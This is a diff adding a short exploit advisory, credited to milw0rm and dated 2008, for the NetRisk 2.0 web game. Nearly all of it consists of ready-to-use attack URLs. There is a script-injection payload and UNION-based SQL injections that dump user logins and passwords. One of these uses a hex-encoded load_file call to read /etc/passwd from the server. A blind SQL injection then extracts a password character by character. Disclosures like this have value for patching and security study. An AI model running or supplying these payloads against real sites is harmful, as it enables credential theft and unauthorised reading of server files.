@@ -1,0 +1,20 @@
+
+# -----------------------------------------------------------------
+# NetRisk <= 2.0 (XSS/SQL Injection) Remote Vulnerabilities
+# -----------------------------------------------------------------
+# Discovered By StAkeR aka athos
+# Download On http://downloads.sourceforge.net/netrisk
+# Works Regardless Of php.ini Settings!
+# -----------------------------------------------------------------
+
+# Cross Site Scripting 	
+# index.php?error=<script>[javascript]</script>
+
+# Remote SQL Injection 
+# index.php?p=profile&id=1+union+all+select+0,0,concat(login,0x3a,password),0,0,0,0,0,0,0,0,0,0,0,0+from+netrisk_users+where+id=1/*
+# index.php?p=profile&id=1+union+all+select+0,0,load_file(0x2F6574632F706173737764),0,0,0,0,0,0,0,0,0,0,0,0/*
+
+# Remote Blind SQL Injection
+# index.php?p=game&id=1 and ascii(substring((select password from netrisk_users where id=1),1,1))=[ascii]/*
+
+# milw0rm.com [2008-11-02]
